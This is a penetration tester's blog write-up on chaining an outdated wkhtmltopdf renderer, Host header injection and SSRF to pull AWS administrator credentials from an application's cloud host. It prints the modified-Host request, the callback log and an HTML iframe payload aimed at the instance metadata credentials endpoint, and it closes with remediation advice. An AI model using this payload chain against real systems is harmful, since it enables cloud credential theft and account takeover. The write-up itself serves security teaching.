---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-05_chaining-for-critical-unauthorized-to-cloud-administrator.md
original_filename: 2023-07-05_chaining-for-critical-unauthorized-to-cloud-administrator.md
title: 'Chaining for Critical: Unauthorized to Cloud Administrator'
category: documents
detected_topics:
- ssrf
- cloud-security
- xss
- password-reset
- command-injection
- otp
tags:
- imported
- documents
- ssrf
- cloud-security
- xss
- password-reset
- command-injection
- otp
language: en
raw_sha256: a08b1b9afa12d407e0e0234d37b263b3cf404bbc42ed48dd352aa361cca61acc
text_sha256: 8e26e0d0d5142cf416a20f7d7c4d599c89ba61cf669e0bf989c2488518acd68a
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: true
---

# Chaining for Critical: Unauthorized to Cloud Administrator

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-05_chaining-for-critical-unauthorized-to-cloud-administrator.md
- Source Type: markdown
- Detected Topics: ssrf, cloud-security, xss, password-reset, command-injection, otp
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: True
- Raw SHA256: `a08b1b9afa12d407e0e0234d37b263b3cf404bbc42ed48dd352aa361cca61acc`
- Text SHA256: `8e26e0d0d5142cf416a20f7d7c4d599c89ba61cf669e0bf989c2488518acd68a`


## Content

---
title: "Chaining for Critical: Unauthorized to Cloud Administrator"
url: "https://www.klogixsecurity.com/scorpion-labs-blog/chaining-for-critical-unauthorized-to-cloud-administrator"
final_url: "https://www.klogixsecurity.com/scorpion-labs-blog/chaining-for-critical-unauthorized-to-cloud-administrator"
authors: ["Jake Wnuk"]
bugs: ["SSRF", "HTML injection"]
publication_date: "2023-07-05"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 965
---

# Chaining for Critical: Unauthorized to Cloud Administrator

Published On: July 5, 2023

[Application Security](https://www.klogixsecurity.com/scorpion-labs-blog/tag/application-security) [Cloud Security](https://www.klogixsecurity.com/scorpion-labs-blog/tag/cloud-security)

[ ](https://twitter.com/intent/tweet?text=I+found+this+interesting+blog+post&url=https://www.klogixsecurity.com/scorpion-labs-blog/chaining-for-critical-unauthorized-to-cloud-administrator) [ ](http://www.facebook.com/share.php?u=https://www.klogixsecurity.com/scorpion-labs-blog/chaining-for-critical-unauthorized-to-cloud-administrator) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://www.klogixsecurity.com/scorpion-labs-blog/chaining-for-critical-unauthorized-to-cloud-administrator)

* * *

**At a Glance**

This post explores a real-world application penetration test where multiple vulnerabilities were chained to escalate from unauthenticated access to cloud administrator privileges.

**You’ll learn:**

  * How misconfigurations like Host header manipulation can introduce unexpected attack paths

  * How application components interact in ways that expand the attack surface

  * How to systematically chain vulnerabilities to maximize impact

**Why it matters:**

Understanding how vulnerabilities interact allows testers to move beyond isolated findings and demonstrate true business risk through realistic attack paths.

* * *

## Introduction

It is not uncommon on penetration tests to find misconfigurations or other low-severity vulnerabilities, such as out-of-date software, components with known vulnerabilities, overly exposed services, or software that can be reconfigured to create additional security boundaries. These items are often identified through vulnerability scans or manual observation and are brought to the defenders' attention for remediation.  
  
As penetration testers and security practitioners, we challenge ourselves to review these findings thoroughly and consider what a malicious actor could do if a given misconfiguration were discovered.  
  
Often these findings are deprioritized when the time comes for remediation and can remain in environments for long periods. These findings can be an opportunity to add value during a penetration test as we consider each component and its interactions from an attacker's perspective. In this post, we explore a story from an application penetration test where chained vulnerabilities maximized impact.

## Reconnaissance 

One essential item of interest in application penetration tests is the unauthenticated environment, the most common attack surface the application exposes. For a recent application test, the application had been routinely reviewed for vulnerabilities and was tested by many parties over the years.

One reoccurring item from the tests was an out-of-date software component (wktmltopdf) that was revealed when looking at the HTTP response to endpoints that ended in .pdf.

HTTP/2 200 OK  
Date: Mon, 11 Apr 2022 17:02:42 GMT  
Content-Type: application/pdf  
Content-Length: 8168  
Server: nginx/1.19.6  
Strict-Transport-Security: max-age=31536000  
X-Ua-Compatible: IE=Edge,chrome=1  
Etag: "bd4a9ecc14b90b0b611fec3dc46854ca"  
Cache-Control: must-revalidate, private, max-age=0  
Set-Cookie: [...snipped...]  
X-Request-Id: ***REDACTED-SUSPECT-TOKEN***X-Runtime: 6.016591  
X-Rack-Cache: miss  
Strict-Transport-Security: max-age=631138519; includeSubdomains  
Content-Security-Policy: default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline'  
X-Content-Type-Options: nosniff  
X-Download-Options: noopen  
X-Permitted-Cross-Domain-Policies: none  
X-Xss-Protection: 1; mode=block  
X-Frame-Options: SAMEORIGIN  
X-Content-Type-Options: nosniff  
  
%PDF-1.4  
1 0 obj  
<<  
/Title (þÿHTTPS Server)  
/Creator (þÿwkhtmltopdf 0.12.3)  
/Producer (þÿQt 4.8.7)  
/CreationDate (D:20220411170242Z)  
>>  
endobj  
  
[...snipped...]  
---  
  
_Figure 1 - An example HTTP response from the target application showing wkhtmltopdf in use._

This item was identified in reports as "Out of Date wkhtmltopdf" but was rated as a low-level finding as the reported CVEs did not influence the application's security posture. This finding was an item of interest in reconnaissance because it is unusual for metadata like this to return from the unauthenticated environment and would appear dynamically in several places within the application.  
  
This was considered abnormal because the PDF generation likely happened dynamically somewhere within the application. Usually, you would probably store a static PDF file on the server or in the cloud and then call it to be displayed. Access to source code was not provided for this particular test, so tracing the source to sink was not an option.  
  
Generally, seeing something generating content dynamically is a pretty exciting feature to test because that means if malicious content was to make it through to the final output, it could be displayed and sent back to the client.  
  
After noticing this, I began to think about how the application could interact with the PDF generation component. Somewhere within the application, data is passed to wktmltopdf to be transformed into PDF content. From reviewing our HTTP history, many of the endpoints ending in .pdf were internal documents that were being processed before being displayed.  
  
Luckily, wktmltopdf is open source, so we can review the source code and documentation for other ideas on interacting with it. One interesting part of this component is that it was designed to take in a HTML document or text and convert it into a PDF, which could then be downloaded or shown to the end user. More interestingly, the tool does not natively perform any validation or sanitization of user supplied HTML.

\---  
layout: default  
\---  
  
All downloads are currently hosted via  
[Github releases](https://github.com/wkhtmltopdf/wkhtmltopdf/releases),  
so you can browse for a specific download or use the links below.  
  
**Do not use wkhtmltopdf with any untrusted HTML** --  
be sure to sanitize any user-supplied HTML/JS,  
otherwise it can lead to complete takeover of the server it is running on!  
Please read the [project status](status.html) for the gory details.  
  
## Release Candidate  
[...snipped...]  
---  
  
_Figure 2 - Notes from docs/downloads.md within the project source noting the lack of validation._

This makes perfect sense because the tool is designed to take HTML input and convert it into a PDF document. Additional checks for "malicious" content would not make sense for this component and would be required by upstream components as pointed out by the developers.

Piecing everything together, this feature was likely used to render converted Microsoft Office documents or other generated HTML documents within the server’s file system or externally. To make use of this feature, we needed to be able to control what content was included in the PDF generation.  
  
During the external fuzzing testing, it was noted that when .pdf was extended to any endpoint such as https://website.com/home.pdf, the content would be passed through wkhtmltopdf and dynamically generated into a PDF which is then shown to the user in the browser.  
  
This functionality is interesting because now we can control what pages are passed to wkhtmltopdf by simply including a .pdf extension to any application endpoint. This condition is likely a piece of middleware the application uses to route specific requests to components, such as a reverse proxy.

![Image showing PDF rendered in the browser. A 403 response was typical for non-existing endpoints showing we could manipulate what was being transformed.](https://www.klogixsecurity.com/hs-fs/hubfs/Scorpion%20Labs%20Blog%20Images/distance-0-403poc.png?width=1003&height=265&name=distance-0-403poc.png)

_Figure 3 - Image showing PDF rendered in the browser. A 403 response was typical for non-existing endpoints showing we could manipulate what was being transformed._

## Follow The Trail

Taking a step back, we see that we have a few big items here:

  * By using wkhtmltopdf, unauthenticated users can interact with a component that dynamically generates content.
  * By adding .pdf to the end of an HTTP route, unauthenticated users have partial control over what content is dynamically generated.

Are you starting to see the bug? Thinking from an offensive perspective, we need complete control of what content is being passed to the dynamic PDF generator to make use of this. Sure, we could transform pages into PDF documents, but the big vulnerability chain would come from combining this with a method to either:

  * Get the server to include remote content.
  * Modify or upload existing data on the server.

By doing this, we could get the server to include malicious content in the generator and kick off a higher-impact vulnerability like Server-Side Request Forgery (SSRF) or a potential deserialization vulnerability.  
  
Thinking of ways to get the server to accept remote content, a quick and easy check was to test to see if the application was vulnerable to Host HTTP header injection.  
  
The Host HTTP header is used to specify what server the request should be sent to. This header must be included with all requests, but it is possible to send a request to one server and the Host header requests another.  
  
This attack is commonly abused in password resets when a malicious Host value is included. The request is still sent and processed by the application server, but some logic may be conditionally based on the Host header, which can cause unintended consequences like the password reset token going to another server instead of the intended recipient.  
  
Because the Host header can manipulate server-side interactions, it makes a good candidate for the vulnerability chain. This way, we will send the request to the correct server but supply a modified Host header to see if we can trick the application into requesting another server for a resource.  
  
This way an HTTP request would reach the target server, but in processing the request, it would reach out to retrieve the content from another server that was specified in the Host header and include that content in further logic.  
  
On the target application, we can send a modified GET request specifying a public IP address of a server we control into the Host header. Our "attacker" controlled server is a simple HTTP server that responds to any GET request from the target with a simple HTML page.

<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'><title>HTTPS Server</title></head><body><pre>HTTPS Server</pre>NotFound!!</body></html>  
---  
  
_Figure 4 - Simple HTML created to be hosted on our attacker-controlled server._

The intention here is to test whether or not it is possible to chain what we know about PDF file generation into another vulnerability that would allow remote content to be included in application logic. Additionally, using a simple non-malicious payload, we can assess if the process works without being hindered by additional technical details.  
  
We can prepare our GET request with a modified Host header and specify a generic .pdf endpoint. The actual endpoint being called would exist on our attacker-controlled server and return content for the target application.

GET /test.pdf HTTP/2  
Host: [...MODIFIED VALUE...]  
Cache-Control: max-age=0  
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"  
Sec-Ch-Ua-Mobile: ?0  
Sec-Ch-Ua-Platform: "macOS"  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Sec-Fetch-Site: none  
Sec-Fetch-Mode: navigate  
Sec-Fetch-User: ?1  
Sec-Fetch-Dest: document  
Accept-Encoding: gzip, deflate  
Accept-Language: en-US,en;q=0.9  
---  
  
_Figure 5 - An HTTP GET request to the target application with a modified Host value._

After sending the GET request with the malicious Host header we get a successful callback on our server.

Captured [...snipped...] requesting /test.pdf  
HTTP Headers:  
{"user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","connection":"Keep-Alive","accept-encoding":"gzip","accept-language":"en-US,*","host":"[...MODIFIED VALUE...]"}  
---  
  
_Figure 6 - Output from our server noting a successful HTTP callback from the target application._

Then on the application side, we can see we have successfully included remote content into the target application:

![Image showing a rendered PDF containing attacker-controlled content in the browser.](https://www.klogixsecurity.com/hs-fs/hubfs/Scorpion%20Labs%20Blog%20Images/distance-1-rci.png?width=999&height=442&name=distance-1-rci.png)_Figure 7 - Image showing a rendered PDF containing attacker-controlled content in the browser._

We identified that when a malicious Host header is provided, the server will be tricked into contacting remote hosts for content.  
  
Looking at the bigger picture, we now have a fully completed attack chain where an unauthenticated attacker can control dynamic content generation within the application and include malicious content from remote origins. The final question remains, what would an attacker do with this exploit?

## Exploit for Impact

This application was hosted in a cloud environment where SSRF vulnerabilities have a higher risk impact, due to the potential of requesting secrets from metadata endpoints that can lead to total account compromise.  
  
In this case, we had the perfect storm for stealing privileged AWS credentials by using the identified exploit to request the /latest/meta-data/iam/security-credentials/* metadata endpoint.  
  
To do so, we can create a malicious HTML document with an iframe pointed at the metadata endpoint and host it on our exposed HTTPS server that we set up to host content for the Host header injection.

<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'><title>K logix Security POC</title></head><body><pre>K logix Security POC</pre><iframe src='<http://169.254.169.254/latest/meta-data/iam/security-credentials/[...snipped...]>' height='800' width='800'></iframe></body></html>  
---  
  
_Figure 8 - HTML containing the malicious iframe to be hosted on our attacker-controlled server._

Then we will create a modified HTTP request to the application where the .pdf extension is added to an endpoint, along with a malicious Host header value pointing at our server.  
  
The application will reach out to our target server, accept the malicious content, generate a PDF, and finally display it in our browser revealing the Administrators account cloud token:

![The final payload rendered in the browser successfully shows the cloud administrator key compromise.](https://www.klogixsecurity.com/hs-fs/hubfs/Scorpion%20Labs%20Blog%20Images/distance-2-impactpoc.png?width=1079&height=383&name=distance-2-impactpoc.png)

_Figure 9 - The final payload rendered in the browser successfully shows the cloud administrator key compromise._

## The Completed Chain

  * By using wkhtmltopdf, unauthenticated users can interact with a component that dynamically generates content.
  * By adding .pdf to the end of an HTTP route, unauthenticated users have partial control over what content is dynamically generated.
  * By adding a malicious Host header, unauthenticated users can provide remote content to be included in the application.
  * By specifying a malicious iframe, unauthenticated users can perform SSRF attacks on the cloud-hosted application, revealing administrator cloud keys.

This attack chain was complete and provided valuable insight for the development team. Kudos to the triage team for the remediation of this vulnerability and an additional thank you to everyone involved.  
  
Remediation and future prevention of the types of vulnerabilities discussed here would likely span multiple parts of the application and cloud infrastructure. For example, implementing controls to better validate HTTP requests and more granular protections of cloud infrastructure, such as the Instance Metadata Service v2, to add security boundaries.  
  
Since discovering this vulnerability, wkhtmltopdf has been archived by its maintainers and is no longer updated. Additionally, a cheeky CVE was filed for wkhtmltopdf three months later that describes the same exploit seen here. Despite being well [documented](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249) that wkhtmltopdf does not perform any sanitization of user-supplied URLs, as it would not make sense to include these checks in this component.  
  
Overall, this finding provided tremendous value to all parties involved, and the process of discovering this exploitation chain won't be one that I soon forget.

![Jake Wnuk](https://www.klogixsecurity.com/hs-fs/hubfs/Jake%20Wnuk.jpg?width=150&height=150&name=Jake%20Wnuk.jpg)

#### [Jake Wnuk](https://www.klogixsecurity.com/scorpion-labs-blog/author/jake-wnuk)

[ ](https://www.linkedin.com/in/jakewnuk/)

Senior Security Consultant, K logix

##### Blog Categories

  * [All](https://www.klogixsecurity.com/scorpion-labs-blog)
  * [Application Security](//www.klogixsecurity.com/scorpion-labs-blog/tag/application-security)
  * [Network Security](//www.klogixsecurity.com/scorpion-labs-blog/tag/network-security)
  * [Cloud Security](//www.klogixsecurity.com/scorpion-labs-blog/tag/cloud-security)
  * [Penetration Testing](//www.klogixsecurity.com/scorpion-labs-blog/tag/penetration-testing)
  * [Purple Teaming](//www.klogixsecurity.com/scorpion-labs-blog/tag/purple-teaming)
  * [Red Teaming](//www.klogixsecurity.com/scorpion-labs-blog/tag/red-teaming)
  * [Social Engineering](//www.klogixsecurity.com/scorpion-labs-blog/tag/social-engineering)
  * [deserialization](//www.klogixsecurity.com/scorpion-labs-blog/tag/deserialization)
  * [exploit](//www.klogixsecurity.com/scorpion-labs-blog/tag/exploit)
  * [java](//www.klogixsecurity.com/scorpion-labs-blog/tag/java)

### Subscribe

Stay up to date with cyber security trends and more
